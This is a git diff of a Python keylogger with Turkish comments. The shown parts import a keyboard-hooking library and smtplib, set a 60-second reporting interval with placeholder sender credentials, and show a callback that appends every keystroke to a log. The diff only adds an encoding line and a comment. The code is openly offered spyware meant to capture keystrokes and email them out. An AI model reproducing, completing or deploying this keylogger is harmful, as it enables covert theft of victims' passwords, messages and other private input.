@@ -1,10 +1,10 @@
+# encoding:utf-8
 import keyboard # klavye kayitlarini kaydetmek icin
 import smtplib #smtp protokolu araciligiyla e-posta gonderme
 from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-
 SEND_REPORT_EVERY = 60 #saniye
 EMAIL_ADDRESS = "e-posta adresiniz"
 EMAIL_PASSWORD = "sifreniz"
@@ -42,3 +42,5 @@ def callback(self, event):
             ad = f"[{ad.upper()}]"
     # son olarak, tus adini global `self.log` degiskenimize ekleyin
     self.log += ad
+    #burda türkçe karakterleri neden kullanmadığımı düşündüm ve programın ilk satırına utf encoding ekledim :D
+    
